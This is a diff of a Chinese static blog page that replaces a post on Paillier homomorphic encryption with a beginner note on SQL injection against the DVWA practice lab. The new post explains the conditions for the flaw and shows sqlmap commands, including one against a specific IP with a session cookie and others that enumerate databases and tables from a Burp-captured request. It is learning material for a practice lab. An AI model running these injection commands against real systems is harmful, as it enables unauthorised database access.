@@ -19,23 +19,28 @@
   <meta name="author" content="Ramoor">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Paillier同态加密密钥生成：  随机选择两个大素数$p,q$，满足$gcd(pq,(p-1)(q-1))&#x3D;1$ 计算$n &#x3D; pq$，$\lambda &#x3D;lcm(p-1,q-1)$ 选择随机整数$g（g\in Z^*_{n^2}）$，定义$L(x)&#x3D; \frac{x-1}{n}$，满足$gcd(L(g^\lambda \mod n^2),n)&amp;#x3D">
+    <meta name="description" content="一、sql注入靶场： dvwa数据库： Mysql 基本概念SQL注入漏洞需要满足两个条件：  参数用户可控 参数带入数据库查询只有满足这两个条件才可能存在SQL注入漏洞  注入方法在实现SQL注入时，既可自己手动注入，也可使用攻击进行注入，这一节主要记录手动注入方法，使用工具的注入将在后文单独记录。 注入工具使用1.sqlmap下载官网： https:&#x2F;&#x2F;sqlmap.org&#x2F; sqlmap使用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Crypto基础篇-同态加密">
-<meta property="og:url" content="http://ramoor.github.io/2025/05/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/index.html">
+<meta property="og:title" content="Web入门">
+<meta property="og:url" content="http://ramoor.github.io/2025/07/04/Web%E5%85%A5%E9%97%A8/index.html">
 <meta property="og:site_name" content="Ramoor">
-<meta property="og:description" content="Paillier同态加密密钥生成：  随机选择两个大素数$p,q$，满足$gcd(pq,(p-1)(q-1))&#x3D;1$ 计算$n &#x3D; pq$，$\lambda &#x3D;lcm(p-1,q-1)$ 选择随机整数$g（g\in Z^*_{n^2}）$，定义$L(x)&#x3D; \frac{x-1}{n}$，满足$gcd(L(g^\lambda \mod n^2),n)&amp;#x3D">
+<meta property="og:description" content="一、sql注入靶场： dvwa数据库： Mysql 基本概念SQL注入漏洞需要满足两个条件：  参数用户可控 参数带入数据库查询只有满足这两个条件才可能存在SQL注入漏洞  注入方法在实现SQL注入时，既可自己手动注入，也可使用攻击进行注入，这一节主要记录手动注入方法，使用工具的注入将在后文单独记录。 注入工具使用1.sqlmap下载官网： https:&#x2F;&#x2F;sqlmap.org&#x2F; sqlmap使用">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-05-29T14:33:39.000Z">
-<meta property="article:modified_time" content="2025-05-29T14:33:50.487Z">
+<meta property="og:image" content="http://ramoor.github.io/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145034446.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145440655.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704150750850.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704151403241.png">
+<meta property="article:published_time" content="2025-07-04T06:34:55.000Z">
+<meta property="article:modified_time" content="2025-07-08T01:14:58.620Z">
 <meta property="article:author" content="Ramoor">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://ramoor.github.io/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145034446.png">
   
   
   
-  <title>Crypto基础篇-同态加密 - Ramoor</title>
+  <title>Web入门 - Ramoor</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -235,7 +240,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Crypto基础篇-同态加密"></span>
+            <span id="subtitle" data-typed-text="Web入门"></span>
           
         </div>
 
@@ -246,8 +251,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-05-29 22:33" pubdate>
-          2025年5月29日 晚上
+        <time datetime="2025-07-04 14:34" pubdate>
+          2025年7月4日 下午
         </time>
       </span>
     
@@ -258,7 +263,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          273 字
+          296 字
         
       </span>
     
@@ -314,34 +319,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Crypto基础篇-同态加密</h1>
+            <h1 id="seo-header">Web入门</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Paillier同态加密"><a href="#Paillier同态加密" class="headerlink" title="Paillier同态加密"></a>Paillier同态加密</h1><p><strong>密钥生成：</strong></p>
+                <h1 id="一、sql注入"><a href="#一、sql注入" class="headerlink" title="一、sql注入"></a>一、sql注入</h1><p><strong>靶场：</strong> dvwa<br><strong>数据库：</strong> Mysql</p>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>SQL注入漏洞需要满足两个条件：</p>
 <ul>
-<li>随机选择两个大素数$p,q$，满足$gcd(pq,(p-1)(q-1))&#x3D;1$</li>
-<li>计算$n &#x3D; pq$，$\lambda &#x3D;lcm(p-1,q-1)$</li>
-<li>选择随机整数$g（g\in Z^*_{n^2}）$，定义$L(x)&#x3D; \frac{x-1}{n}$，满足$gcd(L(g^\lambda \mod n^2),n)&#x3D;1$</li>
-<li>计算$\mu &#x3D; (L(g^\lambda \mod n^2))^{-1}\mod n$</li>
-<li>公钥为$(n,g)$，私钥为$(\lambda,\mu)$</li>
+<li><strong>参数用户可控</strong></li>
+<li><strong>参数带入数据库查询</strong><br>只有满足这两个条件才可能存在SQL注入漏洞</li>
 </ul>
-<blockquote>
-<p><strong>二项定理：</strong><br>$(1+kn)^m\equiv knm+1 \mod n^2$<br>此时有$g^\lambda\equiv 1\mod n$，$g^{n\lambda}\equiv 1 \mod n^2$</p>
-</blockquote>
-<p><strong>简化版：</strong></p>
+<h2 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h2><p>在实现SQL注入时，既可自己手动注入，也可使用攻击进行注入，这一节主要记录手动注入方法，使用工具的注入将在后文单独记录。</p>
+<h2 id="注入工具使用"><a href="#注入工具使用" class="headerlink" title="注入工具使用"></a>注入工具使用</h2><h3 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h3><p><strong>下载官网：</strong> <a target="_blank" rel="noopener" href="https://sqlmap.org/">https://sqlmap.org/</a></p>
+<h4 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h4><p>所有参数都可使用<code>python sqlmap.py -h</code>查看</p>
 <ul>
-<li>$g&#x3D;n+1$</li>
-<li>$\lambda&#x3D;\phi(n)&#x3D;(p-1)(q-1)$</li>
-<li>$\mu &#x3D; \phi(n)^{-1}\mod n$<br><strong>加密：</strong></li>
-<li>明文$m（0\leq m &lt; n）$</li>
-<li>选择随机数$r(0&lt;r&lt;n,r\in Z^*_{n^2})$，且$gcd(r,n)&#x3D;1$</li>
-<li>密文$c&#x3D;g^mr^n\mod n^2$<br><strong>解密：</strong></li>
-<li>明文$m&#x3D;L(c^{\lambda}\mod n^2)\mu \mod n$</li>
+<li><strong>使用URL进行SQL注入</strong><br>使用<code>-u</code>参数，</li>
 </ul>
-<p><strong>性质：</strong><br>$D(E(m_1,r_1)⋅E(m_2,r_2)\mod n^2)&#x3D;m_1+m_2 \mod n$<br>$D(E(m_1,r_1)⋅g^{m_2}\mod n^2)&#x3D;m_1+m_2 \mod n$<br>$D(E(m_1,r_1)^{m_2}\mod n^2)&#x3D;m_1m_2\mod n$<br>$D(E(m_2,r_2)^{m_1}\mod n^2)&#x3D;m_1m_2\mod n$<br>$D(E(m,r)^k\mod n^2)&#x3D;km\mod n$<br>$D(E(m,r)⋅(1+n)^k\mod n^2)&#x3D;m+k\mod n$</p>
-<p><strong>参考：</strong> <a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">其他加密算法 | Lazzaro</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u <span class="hljs-string">&quot;http://159.75.236.232:8081/vulnerabilities/sqli/?id=1*&amp;Submit=Submit#&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=6u59tajkoksou1f7ulk1lpgra3;security=low&quot;</span> --dbs<br></code></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145034446.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="sqlmap联合bupsuite进行注入"><a href="#sqlmap联合bupsuite进行注入" class="headerlink" title="sqlmap联合bupsuite进行注入"></a>sqlmap联合bupsuite进行注入</h4><p>打开火狐浏览器的bp代理，在提交前开启拦截，使用bp进行抓取数据包，然后点击<code>Save item</code>保存到本地为<code>txt</code>文件<br><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145440655.png" srcset="/img/loading.gif" lazyload><br>然后使用sqlmap的<code>-r</code>参数进行注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r C:\Users\Desktop\1.txt --dbs<br></code></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704150750850.png" srcset="/img/loading.gif" lazyload><br>之后根据扫描出的数据库，便可以进行进一步表的扫描<br>使用<code>-D dbname --tables</code>参数进行注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r C:\Users\29226\Desktop\1.txt -D dvwa --tables<br></code></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704151403241.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -377,7 +378,7 @@
       
         <a href="/tags/CTF/" class="print-no-link">#CTF</a>
       
-        <a href="/tags/Crypto/" class="print-no-link">#Crypto</a>
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
       
     </div>
   
@@ -389,8 +390,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Crypto基础篇-同态加密</div>
-      <div>http://ramoor.github.io/2025/05/29/Crypto基础篇-同态加密/</div>
+      <div>Web入门</div>
+      <div>http://ramoor.github.io/2025/07/04/Web入门/</div>
     </div>
     <div class="license-meta">
       
@@ -402,7 +403,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年5月29日</div>
+          <div>2025年7月4日</div>
         </div>
       
       
@@ -434,9 +435,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/01/NSSCTF%202nd/" title="NSSCTF 2nd 复现">
+                      <a href="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/" title="Uploads-labs通关笔记（1-10）">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">NSSCTF 2nd 复现</span>
+                        <span class="hidden-mobile">Uploads-labs通关笔记（1-10）</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -444,8 +445,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="电子取证-长安杯2021 学习记录">
-                        <span class="hidden-mobile">电子取证-长安杯2021 学习记录</span>
+                      <a href="/2025/07/03/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-PEM%E6%96%87%E4%BB%B6/" title="Crypto基础篇-PEM文件">
+                        <span class="hidden-mobile">Crypto基础篇-PEM文件</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
